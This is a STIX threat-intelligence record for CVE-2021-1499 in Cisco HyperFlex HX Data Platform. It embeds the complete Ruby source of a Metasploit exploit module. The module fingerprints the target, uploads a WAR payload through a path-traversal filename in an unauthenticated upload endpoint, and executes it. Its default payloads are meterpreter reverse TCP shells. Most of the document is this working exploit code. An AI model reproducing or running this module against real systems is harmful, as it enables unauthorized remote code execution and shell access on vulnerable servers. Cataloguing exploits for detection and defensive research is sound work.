{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5a249bd7-4b53-41f2-96fe-5afbc6228a3f",
    "created": "2024-08-14T17:04:40.110959Z",
    "modified": "2024-08-14T17:04:40.110963Z",
    "name": "Cisco HyperFlex HX Data Platform unauthenticated file upload to RCE (CVE-2021-1499)",
    "description": " This module exploits an unauthenticated file upload vulnerability in Cisco HyperFlex HX Data Platform's /upload endpoint to upload and execute a payload as the Tomcat user. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/cisco_hyperflex_file_upload_rce.rb",
            "external_id": "cisco_hyperflex_file_upload_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/assessments/82738621-1114-4aba-990a-9ea007b05834"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Cisco HyperFlex HX Data Platform unauthenticated file upload to RCE (CVE-2021-1499)',\n        'Description' => %q{\n          This module exploits an unauthenticated file upload vulnerability in\n          Cisco HyperFlex HX Data Platform's /upload endpoint to upload and\n          execute a payload as the Tomcat user.\n        },\n        'Author' => [\n          'Nikita Abramov',      # Discovery\n          'Mikhail Klyuchnikov', # Discovery\n          'wvu',                 # Research and guidance\n          'jheysel-r7'           # Metasploit Module\n        ],\n        'References' => [\n          ['CVE', '2021-1499'], # HyperFlex HX File Upload\n          ['URL', 'https://attackerkb.com/assessments/82738621-1114-4aba-990a-9ea007b05834']\n        ],\n        'DisclosureDate' => '2021-05-05',\n        'License' => MSF_LICENSE,\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_X86, ARCH_X64, ARCH_JAVA],\n        'Privileged' => false, # Privesc left as an exercise for the reader\n        'Targets' => [\n          [\n            'Java Dropper',\n            {\n              'Platform' => 'java',\n              'Arch' => ARCH_JAVA,\n              'Version' => Rex::Version.new('2.137'),\n              'Type' => :java_dropper,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'java/meterpreter/reverse_tcp',\n                'WfsDelay' => 10\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp',\n                'WfsDelay' => 10\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n    register_options([\n      OptString.new('TARGETURI', [true, 'Base path', '/']),\n      OptString.new('UPLOAD_FILE_NAME', [false, 'Choose a filename for the payload. (Default is random)', rand_text_alpha(rand(8..15))])\n    ])\n  end\n\n  def check\n    # The homepage behind SSL indicates whether the endpoint is running Cisco HyperFlex\n    # Installer:         <title>Hyperflex Installer</title>\n    # Installed Product: <title>Cisco HyperFlex Connect</title>\n    # Both the installer and installed product are vulnerable\n    res_ssl = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path),\n      'rport' => 443,\n      'SSL' => true\n    )\n    unless res_ssl && res_ssl.body[%r{<title>(?:Hyperflex Installer|Cisco HyperFlex Connect)</title>}]\n      return Exploit::CheckCode::Safe\n    end\n\n    # The vulnerability, however, lies on the HTTP endpoint /upload.\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'upload')\n    )\n    if res && res.code == 400 && res.body.include?('Apache Tomcat') && res.headers['Server'] && res.headers['Server'].include?('nginx')\n      return Exploit::CheckCode::Appears\n    elsif res && res.code == 404\n      return CheckCode::Safe\n    end\n\n    CheckCode::Unknown\n  end\n\n  def prepare_payload(app_base, jsp_name)\n    print_status('Preparing payload...')\n    war_payload = payload.encoded_war({ app_name: app_base, jsp_name: jsp_name }).to_s\n    fname = app_base + '.war'\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(fname, nil, nil, 'form-data; name=\"fname\"')\n    post_data.add_part('/upload', nil, nil, 'form-data; name=\"uploadDir\"')\n    post_data.add_part(war_payload,\n                       'application/octet-stream', 'binary',\n                       \"form-data; name=\\\"#{jsp_name}\\\"; filename=\\\"../../../lib/tomcat7/webapps/#{fname}\\\"\")\n    post_data\n  end\n\n  def upload_payload(post_data)\n    print_status('Uploading payload...')\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'upload'),\n      'method' => 'POST',\n      'data' => post_data.to_s,\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\"\n    )\n    if res && res.code == 200 && res.body.to_s =~ /result.*filename:/\n      print_good('Payload uploaded successfully')\n    else\n      fail_with(Failure::UnexpectedReply, 'Payload upload attempt failed')\n    end\n\n    register_dir_for_cleanup('/var/lib/tomcat7/webapps/crossdomain.xml/')\n    register_file_for_cleanup('/var/lib/tomcat7/webapps/crossdomain.xml.war')\n  end\n\n  def execute_payload(url)\n    print_status(\"Executing payload... calling: #{url}\")\n    res = send_request_cgi(\n      'uri' => url,\n      'method' => 'GET'\n    )\n    if res && res.code == 200\n      print_good('Payload executed successfully')\n    else\n      fail_with(Failure::UnexpectedReply, 'Payload execution attempt failed')\n    end\n  end\n\n  def exploit\n    app_base = 'crossdomain.xml'\n    jsp_name = datastore['UPLOAD_FILE_NAME']\n    data = prepare_payload(app_base, jsp_name)\n    upload_payload(data)\n    sleep(datastore['WfsDelay'])\n    if target.name == 'Java Dropper'\n      url = normalize_uri(target_uri.path, app_base.to_s)\n    else\n      url = normalize_uri(target_uri.path, app_base.to_s, \"#{jsp_name}.jsp\")\n    end\n    execute_payload(url)\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-05-05",
    "x_mitre_platforms": [
        "linux'"
    ]
}